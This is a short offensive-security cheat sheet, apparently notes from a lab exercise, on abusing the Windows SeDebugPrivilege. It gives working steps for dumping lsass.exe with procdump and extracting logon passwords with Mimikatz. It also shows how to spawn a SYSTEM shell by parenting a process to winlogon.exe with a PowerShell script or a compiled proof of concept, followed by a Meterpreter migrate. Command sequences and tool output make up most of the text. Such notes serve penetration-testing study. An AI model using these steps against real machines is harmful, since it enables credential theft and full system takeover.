**SeDebugPrivilege** is a type of privilege given by default only to Administrators and let's us troubleshoot programs or create a minidump of processes.

## How to enable permission?
in GPO: 
```
Computer Settings > Windows Settings > Security Settings > Debug Program 
```
(Assign the user/group you want to delegate)

## How to exploit if available
If you have the permission available then you can create a dump of lsass.exe for furher analysis.
1)Use task-manger to "Create a dump" of **lsass.exe**
or
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
2)Parse via Mimikatz
```
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
exit
```


## RCE via SeDebugPrivilege
https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
1)Transfer script to victim'
2)Start power-shell as Administrators
3)Get a list of running processes as SYSTEM/NT
```
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```
4)Example we will target the **winlogon.exe** on **PID 612**
5)Run the exploit with: 
```
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
Where will bee: [MyProcess]::CreateProcessFromParent(612,"C:\Windows\System32\cmd.exe","")

OR

ipmo psgetsys.ps1;  ImpersonateFromParentPid -ppid <parent pid> -command <command to execute> -cmdargs <command arguments>
```
6)This should spawn a cmd NT Authority/SYSTEM

### Other RCE:
https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
1)Compile and upload the **SeDebugPrivilegePoC.exe**
2)Run on the victim that have DebugPrivs like .`/SeDebugPrivilegePoC`
3)This will execute
```
C:\Temp>SeDebugPrivilegePoC.exe
SeDebugPrivilegePoC.exe
[*] If you have SeDebugPrivilege, you can get handles from privileged processes.
[*] This PoC tries to spawn cmd.exe as a winlogon.exe's child process.
[>] Searching winlogon PID.
[+] PID of winlogon: 560
[>] Trying to get handle to winlogon.
[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x2F8).
[+] New process is created successfully.
    |-> PID : 2784
    |-> TID : 2148
```
4)Take the PID login from step 3 and do a perform a migrate in Meterpreter: 
```
migrade PID
```
5)Enjoy a NTSystem shell
